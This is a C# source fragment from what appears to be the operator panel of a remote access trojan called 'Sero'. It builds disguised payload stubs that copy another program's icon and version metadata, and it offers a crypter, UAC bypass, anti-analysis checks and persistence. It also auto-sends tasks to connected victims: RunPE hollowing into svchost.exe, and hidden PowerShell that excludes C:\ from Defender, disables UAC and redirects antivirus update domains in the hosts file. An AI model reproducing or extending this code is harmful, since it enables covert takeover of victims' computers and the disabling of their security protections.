        BldAssemblyPath.Tag = null;
    }

    private void BldSetIcon_Checked(object sender, RoutedEventArgs e)
    {
        var dialog = new Microsoft.Win32.OpenFileDialog
        {
            Filter = "Icon files (*.ico)|*.ico",
            Title = "Select icon file"
        };
        if (dialog.ShowDialog() == true)
        {
            BldIconPath.Text = dialog.FileName;
        }
        else
        {
            // User cancelled, uncheck the checkbox
            BldSetIcon.IsChecked = false;
        }
    }

    private void BldSetIcon_Unchecked(object sender, RoutedEventArgs e)
    {
        BldIconPath.Text = "No icon selected";
    }

    private async void Build_Click(object sender, RoutedEventArgs e)
    {
        var stubDir = GetStubProjectDir();
        if (!Directory.Exists(stubDir))
        {
            Log("[!] Builder: stub/ project not found.");
            TxtBuildStatus.Text = $"Error: {stubDir} not found";
            return;
        }

        // Determine assembly name from selected executable
        string assemblyName = "SeroStub";
        string? selectedExePath = null;

        if (BldSetAssembly.IsChecked == true && BldAssemblyPath.Tag != null)
        {
            selectedExePath = BldAssemblyPath.Tag.ToString()!;
            if (selectedExePath != null && File.Exists(selectedExePath))
            {
                assemblyName = Path.GetFileNameWithoutExtension(selectedExePath);
            }
        }

        var dialogBuild = new Microsoft.Win32.SaveFileDialog
        {
            Filter = "Executable (*.exe)|*.exe",
            FileName = string.Empty,
            Title = "Save built client"
        };
        if (dialogBuild.ShowDialog() != true) return;

        var outputExe = dialogBuild.FileName;

        BtnBuild.IsEnabled = false;
        BuilderPanel.IsEnabled = false;
        TxtBuildStatus.Text = "Generating config...";
        Log("[*] Builder: Starting build...");

        try
        {
            var configPath = Path.Combine(stubDir, "Config.cs");
            await File.WriteAllTextAsync(configPath, GenerateConfigCs());
            Log("[+] Builder: Config.cs generated.");

            var csprojPath = Path.Combine(stubDir, "SeroStub.csproj");
            var csproj = await File.ReadAllTextAsync(csprojPath);

            // Extract metadata from selected executable if checkbox is checked
            var assemblyTitle = assemblyName;
            var company = string.Empty;
            var product = string.Empty;
            var fileVersion = "1.0.0.0";
            var productVersion = "1.0.0.0";
            var copyright = string.Empty;

            if (BldSetAssembly.IsChecked == true && selectedExePath != null && File.Exists(selectedExePath))
            {
                try
                {
                    var versionInfo = System.Diagnostics.FileVersionInfo.GetVersionInfo(selectedExePath);

                    if (!string.IsNullOrWhiteSpace(versionInfo.ProductName))
                        product = versionInfo.ProductName.Trim();
                    if (!string.IsNullOrWhiteSpace(versionInfo.CompanyName))
                        company = versionInfo.CompanyName.Trim();
                    if (!string.IsNullOrWhiteSpace(versionInfo.FileVersion))
                    {
                        fileVersion = versionInfo.FileVersion.Trim();
                        // Clean version - keep only numeric version (e.g., "0.18.4.5" from "0.18.4.5-b1a6201...")
                        var parts = fileVersion.Split(new[] { '-', '+', ' ' }, System.StringSplitOptions.None);
                        if (parts.Length > 0 && !string.IsNullOrEmpty(parts[0]))
                            fileVersion = parts[0];
                    }

                    // Use FileVersion for ProductVersion to avoid random characters
                    productVersion = fileVersion; // Force use of cleaned FileVersion

                    if (!string.IsNullOrWhiteSpace(versionInfo.FileDescription))
                        assemblyTitle = versionInfo.FileDescription.Trim();

                    // Extract copyright - try multiple sources
                    if (!string.IsNullOrWhiteSpace(versionInfo.LegalCopyright))
                        copyright = versionInfo.LegalCopyright.Trim();

                    Log($"[+] Builder: Extracted metadata from {Path.GetFileName(selectedExePath)}");
                    Log($"[+] Builder: Company={company}, Product={product}, FileVersion={fileVersion}, ProductVersion={productVersion}, Copyright='{copyright}'");
                }
                catch (Exception ex)
                {
                    Log($"[!] Builder: Could not extract metadata: {ex.Message}");
                }
            }

            if (string.IsNullOrEmpty(assemblyTitle)) assemblyTitle = "";
            if (string.IsNullOrEmpty(company)) company = "";
            if (string.IsNullOrEmpty(product)) product = "";
            if (string.IsNullOrEmpty(fileVersion)) fileVersion = "1.0.0.0";
            if (string.IsNullOrEmpty(productVersion)) productVersion = fileVersion;

            // Escape XML special characters
            var escapeXml = (string s) => System.Security.SecurityElement.Escape(s) ?? s;
            assemblyName = escapeXml(assemblyName);
            assemblyTitle = escapeXml(assemblyTitle);
            company = escapeXml(company);
            product = escapeXml(product);
            fileVersion = escapeXml(fileVersion);
            productVersion = escapeXml(productVersion);
            copyright = escapeXml(copyright);

            csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                @"<AssemblyName>[^<]*</AssemblyName>", $"<AssemblyName>{assemblyName}</AssemblyName>");
            csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                @"<AssemblyTitle>[^<]*</AssemblyTitle>", $"<AssemblyTitle>{assemblyTitle}</AssemblyTitle>");
            csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                @"<Description>[^<]*</Description>", $"<Description>{assemblyTitle}</Description>");
            csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                @"<Product>[^<]*</Product>", $"<Product>{product}</Product>");
            csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                @"<Company>[^<]*</Company>", $"<Company>{company}</Company>");
            csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                @"<FileVersion>[^<]*</FileVersion>", $"<FileVersion>{fileVersion}</FileVersion>");

            // Update or add Copyright
            if (csproj.Contains("<Copyright>"))
            {
                csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                    @"<Copyright>[^<]*</Copyright>", $"<Copyright>{copyright}</Copyright>");
            }
            else
            {
                // Add Copyright after Company if it doesn't exist
                csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                    @"(<Company>[^<]*</Company>)", $"$1\n    <Copyright>{copyright}</Copyright>");
            }

            // Update ProductVersion and InformationalVersion
            if (csproj.Contains("<ProductVersion>"))
            {
                csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                    @"<ProductVersion>[^<]*</ProductVersion>", $"<ProductVersion>{productVersion}</ProductVersion>");
            }

            if (csproj.Contains("<InformationalVersion>"))
            {
                csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                    @"<InformationalVersion>[^<]*</InformationalVersion>", $"<InformationalVersion>{productVersion}</InformationalVersion>");
            }

            await File.WriteAllTextAsync(csprojPath, csproj);

            // Clean build cache (offloaded — can be slow on large NativeAOT obj dirs)
            var binDir = Path.Combine(stubDir, "bin");
            var objDir = Path.Combine(stubDir, "obj");
            TxtBuildStatus.Text = "Cleaning cache...";
            await Task.Run(() =>
            {
                try { if (Directory.Exists(binDir)) Directory.Delete(binDir, true); } catch { }
                try { if (Directory.Exists(objDir)) Directory.Delete(objDir, true); } catch { }
            });

            // Choose build mode: NativeAOT for hollowing, SingleFile otherwise
            var useAot = BldHollowing.IsChecked == true;
            var buildMode = useAot ? "NativeAOT" : "SingleFile";
            TxtBuildStatus.Text = $"Compiling ({buildMode})...";
            Log($"[*] Builder: stub dir = {stubDir}");
            Log($"[*] Builder: dotnet publish ({buildMode})...");

            var tempOut = Path.Combine(Path.GetTempPath(), "sero_build_" + Guid.NewGuid().ToString("N")[..8]);

            // Build icon parameter if icon is set
            var iconArg = "";
            if (BldIconPath.Text != "No icon selected" && File.Exists(BldIconPath.Text))
            {
                iconArg = $" -p:ApplicationIcon=\"{BldIconPath.Text}\"";
                Log($"[*] Builder: Icon will be embedded: {BldIconPath.Text}");
            }

            var publishArgs = useAot
                ? $"publish \"{csprojPath}\" -c Release -r win-x64 -p:PublishAot=true -p:InvariantGlobalization=true -p:IlcOptimizationPreference=Size -p:IlcGenerateStackTraceData=false{iconArg} -o \"{tempOut}\""
                : $"publish \"{csprojPath}\" -c Release -r win-x64 --self-contained -p:PublishSingleFile=true -p:PublishTrimmed=true -p:TrimMode=full -p:InvariantGlobalization=true -p:UseSystemResourceKeys=true -p:MetadataUpdaterSupport=false -p:EnableCompressionInSingleFile=true -p:DebuggerSupport=false -p:StackTraceSupport=false -p:HttpActivityPropagationSupport=false -p:EnableUnsafeBinaryFormatterSerialization=false{iconArg} -o \"{tempOut}\"";
            var psi = new System.Diagnostics.ProcessStartInfo
            {
                FileName = "dotnet",
                Arguments = publishArgs,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true,
                WorkingDirectory = stubDir,
            };

            // NativeAOT needs vswhere.exe in PATH to find MSVC linker
            if (useAot)
            {
                var vsInstaller = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
                    "Microsoft Visual Studio", "Installer");
                if (Directory.Exists(vsInstaller))
                    psi.Environment["PATH"] = vsInstaller + ";" + Environment.GetEnvironmentVariable("PATH");
            }

            using var proc = System.Diagnostics.Process.Start(psi)!;
            // Read both streams in parallel to avoid deadlock
            var stdoutTask = proc.StandardOutput.ReadToEndAsync();
            var stderrTask = proc.StandardError.ReadToEndAsync();
            await proc.WaitForExitAsync();
            var stdout = await stdoutTask;
            var stderr = await stderrTask;

            if (proc.ExitCode != 0)
            {
                Log($"[!] Builder: Build failed (exit {proc.ExitCode})");
                if (!string.IsNullOrWhiteSpace(stderr)) Log(stderr);
                if (!string.IsNullOrWhiteSpace(stdout)) Log(stdout);
                TxtBuildStatus.Text = "Build FAILED. Check logs.";
                return;
            }

            Log("[+] Builder: Compilation successful.");

            var builtExe = Path.Combine(tempOut, assemblyName + ".exe");
            if (!File.Exists(builtExe))
            {
                var exes = Directory.GetFiles(tempOut, "*.exe");
                if (exes.Length > 0) builtExe = exes[0];
                else
                {
                    Log("[!] Builder: Output exe not found.");
                    TxtBuildStatus.Text = "Build output not found.";
                    return;
                }
            }

            File.Copy(builtExe, outputExe, true);
            try { Directory.Delete(tempOut, true); } catch { }

            // Apply crypter if enabled
            if (BldEncrypt.IsChecked == true)
            {
                TxtBuildStatus.Text = "Applying crypter...";
                Log("[*] Builder: Applying AES crypter...");

                // Pass icon + metadata so the C++ loader is compiled with them via rc.exe
                string? iconForLoader = (BldIconPath.Text != "No icon selected" && File.Exists(BldIconPath.Text))
                    ? BldIconPath.Text : null;
                var meta = (BldSetAssembly.IsChecked == true && selectedExePath != null && File.Exists(selectedExePath))
                    ? new SeroServer.Builder.LoaderMetadata(product, company, fileVersion, productVersion, assemblyTitle, copyright)
                    : null;

                await SeroServer.Builder.CrypterBuilder.ApplyAsync(outputExe, Log, iconForLoader, meta, BldUacBypass.IsChecked == true);
            }
            else
            {
                // No crypter — icon already embedded via -p:ApplicationIcon at compile time
            }

            var size = new FileInfo(outputExe).Length;
            var sizeStr = size < 1024 * 1024
                ? $"{size / 1024.0:F0} KB"
                : $"{size / (1024.0 * 1024.0):F1} MB";
            Log($"[+] Builder: {Path.GetFileName(outputExe)} ({size:N0} bytes) saved.");
            TxtBuildStatus.Text = $"Built: {Path.GetFileName(outputExe)} ({sizeStr})";
            TxtStatusBar.Text = "Build successful.";

            MessageBox.Show(
                $"Build successful!\n\n" +
                $"File: {Path.GetFileName(outputExe)}\n" +
                $"Size: {sizeStr}\n" +
                $"Mode: {buildMode}",
                "Sero — Build Complete", MessageBoxButton.OK, MessageBoxImage.Information);
        }
        catch (Exception ex)
        {
            Log($"[!] Builder: {ex.Message}");
            TxtBuildStatus.Text = $"Error: {ex.Message}";
        }
        finally
        {
            BtnBuild.IsEnabled = true;
            BuilderPanel.IsEnabled = true;
        }
    }

    // Helper: run a process and return (exitCode, stdout+stderr combined) without deadlocking
    private static async Task<(int code, string output)> RunProcessAsync(System.Diagnostics.ProcessStartInfo psi)
    {
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;
        using var p = System.Diagnostics.Process.Start(psi)!;
        var outTask = p.StandardOutput.ReadToEndAsync();
        var errTask = p.StandardError.ReadToEndAsync();
        await p.WaitForExitAsync();
        return (p.ExitCode, await outTask + await errTask);
    }



    private void BuildConfig_Click(object sender, RoutedEventArgs e)
    {
        int.TryParse(BldPort.Text, out int port);
        int.TryParse(BldReconnectDelay.Text, out int reconnect);
        if (port < 1 || port > 65535) port = 7777;

        // Determine assembly name
        string name = "RuntimeBroker";

        var configDict = new Dictionary<string, object>
        {
            { "host", GetPrimaryHost() },
            { "port", port },
            { "assemblyName", name },
            { "useMutex", BldUseMutex.IsChecked == true },
            { "antiDebug", BldAntiDebug.IsChecked == true },
            { "antiVM", BldAntiVM.IsChecked == true },
            { "antiDetect", BldAntiDetect.IsChecked == true },
            { "antiSandbox", BldAntiSandbox.IsChecked == true },
            { "persistRegistry", BldPersistRegistry.IsChecked == true },
            { "persistStartup", BldPersistStartup.IsChecked == true },
            { "reconnectDelayMs", reconnect > 0 ? reconnect : 5000 },
        };

        // Only add mutexName if "Use Mutex" is checked
        if (BldUseMutex.IsChecked == true)
        {
            configDict["mutexName"] = BldMutex.Text.Trim();
        }

        var dialog = new Microsoft.Win32.SaveFileDialog
        {
            Filter = "JSON Config (*.json)|*.json",
            FileName = "config.json",
            Title = "Export Client Config"
        };

        if (dialog.ShowDialog() == true)
        {
            var json = JsonSerializer.Serialize(configDict, new JsonSerializerOptions { WriteIndented = true });
            File.WriteAllText(dialog.FileName, json);
            Log($"[+] Builder: Config exported to {dialog.FileName}");
            TxtStatusBar.Text = "Config exported.";
        }
    }

    // ── Settings ────────────────────────────────────

    private async void GetMyIP_Click(object sender, RoutedEventArgs e)
    {
        try
        {
            TxtPortResult.Text = "Getting IP...";
            using var http = new System.Net.Http.HttpClient { Timeout = TimeSpan.FromSeconds(5) };
            var ip = (await http.GetStringAsync("https://api.ipify.org")).Trim();
            SettingsCheckIP.Text = ip;
            TxtPortResult.Text = $"Your public IP: {ip}";
            TxtPortResult.Foreground = (Brush)FindResource("DimBrush");
        }
        catch { TxtPortResult.Text = "Failed to get IP."; }
    }

    private async void CheckPort_Click(object sender, RoutedEventArgs e)
    {
        var ip = SettingsCheckIP.Text.Trim();
        if (!int.TryParse(SettingsCheckPort.Text.Trim(), out int port) || port < 1 || port > 65535)
        {
            TxtPortResult.Text = "Invalid port.";
            TxtPortResult.Foreground = new SolidColorBrush(Color.FromRgb(0xcc, 0x33, 0x33));
            return;
        }

        if (ip is "127.0.0.1" or "localhost" or "::1" or "0.0.0.0" or "")
        {
            TxtPortResult.Text = "Cannot check localhost.";
            TxtPortResult.Foreground = new SolidColorBrush(Color.FromRgb(0xcc, 0x33, 0x33));
            return;
        }

        TxtPortResult.Text = $"Checking {ip}:{port}...";
        TxtPortResult.Foreground = (Brush)FindResource("DimBrush");

        try
        {
            using var tcp = new System.Net.Sockets.TcpClient();
            var cts = new CancellationTokenSource(TimeSpan.FromSeconds(5));
            await tcp.ConnectAsync(ip, port, cts.Token);

            TxtPortResult.Text = $"Port {port} is OPEN on {ip}";
            TxtPortResult.Foreground = new SolidColorBrush(Color.FromRgb(0x1b, 0x8a, 0x2e));
        }
        catch (OperationCanceledException)
        {
            TxtPortResult.Text = $"Port {port} is CLOSED or unreachable on {ip} (timeout)";
            TxtPortResult.Foreground = new SolidColorBrush(Color.FromRgb(0xcc, 0x33, 0x33));
        }
        catch
        {
            TxtPortResult.Text = $"Port {port} is CLOSED on {ip} (connection refused)";
            TxtPortResult.Foreground = new SolidColorBrush(Color.FromRgb(0xcc, 0x33, 0x33));
        }
    }

    private void SettingsApply_Click(object sender, RoutedEventArgs e)
    {
        if (int.TryParse(SettingsMaxClients.Text, out int max) && max > 0)
        {
            if (_server != null)
                _server.MaxConnectedClients = max;
            Log($"[*] Max connected clients set to {max}.");
            TxtStatusBar.Text = $"Settings applied (max clients: {max}).";
        }

        // Discord RPC toggle
        if (SettingsDiscordRPC.IsChecked == true && _discordRpc == null && _server is { IsRunning: true })
        {
            try
            {
                _discordRpc = new Net.SeroDiscordRPC();
                _discordRpc.Start(() => _server?.ConnectedClients.Count ?? 0);
                Log("[*] Discord RPC enabled.");
            }
            catch { }
        }
        else if (SettingsDiscordRPC.IsChecked == false && _discordRpc != null)
        {
            _discordRpc.Stop();
            _discordRpc = null;
            Log("[*] Discord RPC disabled. Restart Discord or wait a few seconds for it to clear.");
        }

        if (!int.TryParse(SettingsMaxClients.Text, out int _check) || _check <= 0)
        {
            Log("[!] Invalid max clients value.");
        }
    }

    // ── AutoTask ────────────────────────────────────

    private void AutoTask_AddFile_Click(object sender, RoutedEventArgs e)
    {
        var dlg = new Microsoft.Win32.OpenFileDialog
        {
            Title = "Select file to auto-execute on clients",
            Filter = "Executables (*.exe)|*.exe|All files (*.*)|*.*"
        };
        if (dlg.ShowDialog() != true) return;

        var fileBytes = File.ReadAllBytes(dlg.FileName);
        var entry = new Data.AutoTaskEntry
        {
            FileName = Path.GetFileName(dlg.FileName),
            FileBase64 = Convert.ToBase64String(fileBytes),
            FileSize = fileBytes.Length
        };
        _autoTasks.Add(entry);
        Log($"[+] AutoTask: added {entry.FileName} ({entry.SizeDisplay})");
        _ = ExecuteAutoTasksForAllConnected();
    }

    private void AutoTask_AddHollow_Click(object sender, RoutedEventArgs e)
    {
        var dlg = new Microsoft.Win32.OpenFileDialog
        {
            Title = "Select PE to auto-execute via RunPE (process hollowing)",
            Filter = "Executables (*.exe)|*.exe|All files (*.*)|*.*"
        };
        if (dlg.ShowDialog() != true) return;

        var targetDlg = new TagDialog("svchost.exe");
        targetDlg.Title = "RunPE — Target Process";
        targetDlg.Owner = this;
        if (targetDlg.ShowDialog() != true || string.IsNullOrWhiteSpace(targetDlg.TagValue)) return;

        var target = targetDlg.TagValue;
        var fileBytes = File.ReadAllBytes(dlg.FileName);
        var entry = new Data.AutoTaskEntry
        {
            Type = Data.AutoTaskType.HollowExec,
            FileName = Path.GetFileName(dlg.FileName),
            FileBase64 = Convert.ToBase64String(fileBytes),
            FileSize = fileBytes.Length,
            HollowTarget = target
        };
        _autoTasks.Add(entry);
        Log($"[+] AutoTask: added RunPE {entry.FileName} -> {target} ({entry.SizeDisplay})");
        _ = ExecuteAutoTasksForAllConnected();
    }

    private void AutoTask_ExcludeDefender_Click(object sender, RoutedEventArgs e)
    {
        if (_autoTasks.Any(t => t.FileName == "Exclude C:\\"))
        {
            Log("[!] AutoTask: Exclude C:\\ already in list.");
            return;
        }

        var entry = new Data.AutoTaskEntry
        {
            Type = Data.AutoTaskType.ShellCommand,
            FileName = "Exclude C:\\",
            ShellCommand = "powershell -NoP -W Hidden -Command \"Add-MpPreference -ExclusionPath 'C:\\' -Force\"",
            AdminOnly = true
        };
        _autoTasks.Add(entry);
        Log("[+] AutoTask: Exclude C:\\ from Defender added (auto-executes on admin clients).");
        _ = ExecuteAutoTasksForAllConnected();
    }

    private void AutoTask_DisableUAC_Click(object sender, RoutedEventArgs e)
    {
        if (_autoTasks.Any(t => t.FileName == "Disable UAC"))
        {
            Log("[!] AutoTask: Disable UAC already in list.");
            return;
        }

        var entry = new Data.AutoTaskEntry
        {
            Type = Data.AutoTaskType.ShellCommand,
            FileName = "Disable UAC",
            ShellCommand = "powershell -NoP -W Hidden -Command \"Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name 'EnableLUA' -Value 0 -Type DWord -Force\"",
            AdminOnly = true
        };
        _autoTasks.Add(entry);
        Log("[+] AutoTask: Disable UAC added (auto-executes on admin clients, needs reboot).");
        _ = ExecuteAutoTasksForAllConnected();
    }


    private void AutoTask_BlockAvDomains_Click(object sender, RoutedEventArgs e)
    {
        if (_autoTasks.Any(t => t.FileName == "Block AV Domains"))
        {
            Log("[!] AutoTask: Block AV Domains already in list.");
            return;
        }

        var domains = new[]
        {
            "definitionupdates.microsoft.com", "wdcp.microsoft.com", "wdcpalt.microsoft.com",
            "smartscreen-prod.microsoft.com", "smartscreen.microsoft.com",
            "checkappexec.microsoft.com", "unitedstates.smartscreen-prod.microsoft.com",
            "avast.com", "www.avast.com", "update.avast.com", "iavs9x.u.avast.com", "shepherd.avast.com",
            "avg.com", "www.avg.com", "update.avg.com",
            "bitdefender.com", "www.bitdefender.com", "download.bitdefender.com",
            "upgrade.bitdefender.com", "nimbus.bitdefender.net", "bitdefender.net",
            "eset.com", "www.eset.com", "update.eset.com", "repository.eset.com",
            "mcafee.com", "www.mcafee.com", "download.mcafee.com", "update.nai.com",
            "norton.com", "www.norton.com", "symantec.com", "www.symantec.com",
            "liveupdate.symantec.com", "liveupdate.symantecliveupdate.com",
            "kaspersky.com", "www.kaspersky.com", "update.kaspersky.com",
            "downloads.kaspersky.com", "dnl-01.geo.kaspersky.com",
            "sophos.com", "www.sophos.com", "downloads.sophos.com",
            "dci.sophosupd.com", "dci.sophosupd.net",
            "malwarebytes.com", "www.malwarebytes.com",
            "data-cdn.mbamupdates.com", "mbam.cdn.malwarebytes.com",
            "trendmicro.com", "www.trendmicro.com", "update.trendmicro.com",
            "crowdstrike.com", "www.crowdstrike.com", "falcon.crowdstrike.com", "ts01-b.cloudsink.net",
            "sentinelone.com", "www.sentinelone.com",
            "f-secure.com", "www.f-secure.com",
            "drweb.com", "www.drweb.com", "update.drweb.com",
            "avira.com", "www.avira.com", "update.avira.com",
            "emsisoft.com", "www.emsisoft.com",
            "comodo.com", "www.comodo.com",
            "cylance.com", "www.cylance.com", "blackberry.com", "www.blackberry.com",
            "carbonblack.com", "www.carbonblack.com",
            "webroot.com", "www.webroot.com",
            "pandasecurity.com", "www.pandasecurity.com"
        };

        var hostsPath = @"C:\Windows\System32\drivers\etc\hosts";
        var sb = new System.Text.StringBuilder();
        sb.Append($"$h='{hostsPath}';$c=Get-Content $h -EA SilentlyContinue;$a=@(");
        for (int i = 0; i < domains.Length; i++)
        {
            if (i > 0) sb.Append(',');
            sb.Append($"'0.0.0.0 {domains[i]}'");
        }
        sb.Append(");$n=$a|?{$c -notcontains $_};if($n){Add-Content $h ($n-join[char]10)};ipconfig /flushdns|Out-Null");

        var entry = new Data.AutoTaskEntry
        {
            Type = Data.AutoTaskType.ShellCommand,
            FileName = "Block AV Domains",
            ShellCommand = $"powershell -NoP -W Hidden -Command \"{sb}\"",
            AdminOnly = true
        };
        _autoTasks.Add(entry);
        Log($"[+] AutoTask: Block AV Domains added ({domains.Length} domains will be redirected to 0.0.0.0).");
        _ = ExecuteAutoTasksForAllConnected();
    }

    private void AutoTask_Remove_Click(object sender, RoutedEventArgs e)
    {
        var selected = GridAutoTasks.SelectedItems.Cast<Data.AutoTaskEntry>().ToList();
        foreach (var task in selected)
        {
            _autoTasks.Remove(task);
            Log($"[-] AutoTask: removed {task.FileName}");
        }
    }

    private async Task ExecuteAutoTasksForAllConnected()
    {
        if (_server == null || _autoTasks.Count == 0) return;
        foreach (var client in _server.ConnectedClients.Values.ToList())
        {
            try
            {
                await ExecuteAutoTasksForClient(client);
                await Task.Delay(200); // Space out between clients
            }
            catch { }
        }
    }

    public async Task ExecuteAutoTasksForClient(Data.ConnectedClient client)
    {
        foreach (var task in _autoTasks.ToList())
        {
            // Track by HWID so reconnecting clients don't re-execute
            if (task.ExecutedHwids.Contains(client.Hwid)) continue;

            // Skip admin-only tasks for non-admin clients
            if (task.AdminOnly && !client.IsAdmin) continue;

            try
            {
                Protocol.Packet packet;

                if (task.Type == Data.AutoTaskType.ShellCommand)
                {
                    packet = new Protocol.Packet
                    {
                        Type = Protocol.PacketType.RemoteShell,
                        Data = task.ShellCommand
                    };
                }
                else if (task.Type == Data.AutoTaskType.HollowExec)
                {
                    var data = new Protocol.HollowExecData
                    {
                        FileName = task.FileName,
                        FileBase64 = task.FileBase64,
                        TargetProcess = task.HollowTarget
                    };
                    packet = new Protocol.Packet
                    {
                        Type = Protocol.PacketType.HollowExec,
                        Data = Newtonsoft.Json.JsonConvert.SerializeObject(data)
                    };
                }
                else
                {
                    var data = new Protocol.RemoteFileExecData
                    {
                        FileName = task.FileName,
                        FileBase64 = task.FileBase64
                    };
                    packet = new Protocol.Packet
                    {
                        Type = Protocol.PacketType.RemoteFileExec,
                        Data = Newtonsoft.Json.JsonConvert.SerializeObject(data)
                    };
                }

                if (client.Stream == null) continue;
                await client.WriteLock.WaitAsync();
                try { await Protocol.Packet.WriteToStreamAsync(client.Stream, packet); }
                finally { client.WriteLock.Release(); }
                task.ExecutedHwids.Add(client.Hwid);
                task.ExecutionCount++;
                Log($"[+] AutoTask: executed {task.FileName} on {client.Id} (HWID tracked)");

                // Refresh AutoTask grid to update execution count
                Dispatcher.Invoke(() => GridAutoTasks.Items.Refresh());

                // Small delay between sends to avoid saturating
                await Task.Delay(100);
            }
            catch (Exception ex)
            {
                Log($"[!] AutoTask: failed {task.FileName} on {client.Id}: {ex.Message}");
            }
        }
    }

    // ── Cert Setup / Export ─────────────────────────

    /// <summary>
    /// Shown on first launch — lets the user generate+save OR import an existing cert.
    /// </summary>
    private void ShowCertSetupDialog()
    {
        var dlg = new Window
        {
            Title = "Sero — TLS Certificate Setup",
            Width = 420, Height = 200,
            WindowStartupLocation = WindowStartupLocation.CenterScreen,
            ResizeMode = ResizeMode.NoResize,
            Background = new SolidColorBrush(Color.FromRgb(24, 24, 24)),
            WindowStyle = WindowStyle.ToolWindow,
        };

        var sp = new System.Windows.Controls.StackPanel { Margin = new Thickness(20) };

        sp.Children.Add(new System.Windows.Controls.TextBlock
        {
            Text = "No TLS certificate found. Choose an option:",
            Foreground = Brushes.White,
            FontSize = 13,
            Margin = new Thickness(0, 0, 0, 16),
            TextWrapping = TextWrapping.Wrap,
        });

        var btnImport = new System.Windows.Controls.Button
        {
            Content = "Import backup or certificate (.sero / .pfx)…",
            Margin = new Thickness(0, 0, 0, 8),
            Padding = new Thickness(10, 6, 10, 6),
            HorizontalAlignment = HorizontalAlignment.Stretch,
        };
        var btnGen = new System.Windows.Controls.Button
        {
            Content = "Generate new certificate and save it…",
            Padding = new Thickness(10, 6, 10, 6),
            HorizontalAlignment = HorizontalAlignment.Stretch,
        };

        btnImport.Click += (_, _) => ImportCertOrBackup(() => dlg.Close());

        btnGen.Click += (_, _) =>
        {
            dlg.Close();
            var save = new Microsoft.Win32.SaveFileDialog
            {
                Filter = "PFX Certificate (*.pfx)|*.pfx",
                FileName = "sero_cert.pfx",
                Title = "Choose where to save the certificate"
            };
            if (save.ShowDialog() != true) return;
            try
            {
                Net.CertificateHelper.GenerateAndExportTo(save.FileName);
                Log($"[+] Certificate generated and saved to {save.FileName}");
                try { BldCertHash.Text = Net.CertificateHelper.GetCertSha256Hash(); } catch { }
                MessageBox.Show(
                    $"Certificat sauvegardé :\n{save.FileName}\n\nAucun mot de passe requis pour l'importer.",
                    "Sero — Certificat prêt", MessageBoxButton.OK, MessageBoxImage.Information);
            }
            catch (Exception ex) { Log($"[!] Cert generation failed: {ex.Message}"); }
        };

        sp.Children.Add(btnImport);
        sp.Children.Add(btnGen);
        dlg.Content = sp;
        dlg.ShowDialog();
    }

    private void ExportBackup_Click(object sender, RoutedEventArgs e)
    {
        try
        {
            var authKey = BldAuthKey.Text.Trim();
            if (string.IsNullOrEmpty(authKey))
            {
                MessageBox.Show("Generate or set an auth key in the Builder tab before exporting a backup.",
                    "Sero — No Auth Key", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            var dialog = new Microsoft.Win32.SaveFileDialog
            {
                Filter = "Sero Backup (*.sero)|*.sero",
                FileName = "sero_backup.sero",
                Title = "Export Server Backup (cert + auth key)"
            };
            if (dialog.ShowDialog() != true) return;

            CertificateHelper.ExportServerBackup(dialog.FileName, authKey);
            Log($"[+] Server backup exported to {dialog.FileName}");
            TxtStatusBar.Text = "Server backup exported.";
            MessageBox.Show(
                $"Backup exporté :\n{dialog.FileName}\n\nContient le certificat TLS et la clé d'auth.\nImportez ce fichier sur une autre machine pour que les clients reconnectent.",
                "Sero — Backup réussi", MessageBoxButton.OK, MessageBoxImage.Information);
        }
        catch (Exception ex)
        {
            Log($"[!] Backup export failed: {ex.Message}");
            MessageBox.Show($"Export failed: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
        }
    }

    private void ImportBackup_Click(object sender, RoutedEventArgs e)
        => ImportCertOrBackup(null);

    private void ImportCertOrBackup(Action? onSuccess)
    {
        var open = new Microsoft.Win32.OpenFileDialog
        {
            Filter = "Sero Backup or Certificate (*.sero;*.pfx)|*.sero;*.pfx|All Files (*.*)|*.*",
            Title = "Import server backup (.sero) or certificate (.pfx)"
        };
        if (open.ShowDialog() != true) return;

        try
        {
            var path = open.FileName;
            var ext = System.IO.Path.GetExtension(path).ToLowerInvariant();

            if (ext == ".sero")
            {
                var restoredKey = CertificateHelper.ImportServerBackup(path);
                try { BldCertHash.Text = CertificateHelper.GetCertSha256Hash(); } catch { }

                if (!string.IsNullOrEmpty(restoredKey))
                {
                    BldAuthKey.Text = restoredKey;
                    BldAuthKey.IsReadOnly = true;
                    SaveConfig();
                }
                Log("[+] Server backup restored (cert + auth key).");
                TxtStatusBar.Text = "Backup restored.";
                MessageBox.Show(
                    "Backup restauré.\nCertificat + clé d'auth restaurés.\nRedémarrez le serveur pour que les clients reconnectent.",
                    "Sero — Import réussi", MessageBoxButton.OK, MessageBoxImage.Information);
            }
            else
            {
                try { CertificateHelper.ImportCertificate(path, null); }
                catch
                {
                    var pwd = PromptPassword("Ce certificat est protégé par un mot de passe.\nEntrez le mot de passe PFX :");
                    if (pwd == null) return;
                    CertificateHelper.ImportCertificate(path, pwd);
                }
                try { BldCertHash.Text = CertificateHelper.GetCertSha256Hash(); } catch { }
                Log("[+] Certificate imported.");
                TxtStatusBar.Text = "Certificate imported.";
                MessageBox.Show(
                    "Certificat importé.\nATTENTION : la clé d'auth n'est pas incluse dans un .pfx.\nVérifiez que la clé d'auth dans le Builder correspond à celle de vos stubs.",
                    "Sero — Import cert", MessageBoxButton.OK, MessageBoxImage.Warning);
            }

            onSuccess?.Invoke();
        }
        catch (Exception ex)
        {
            Log($"[!] Import failed: {ex.Message}");
            MessageBox.Show($"Import échoué : {ex.Message}", "Erreur", MessageBoxButton.OK, MessageBoxImage.Error);
        }
    }

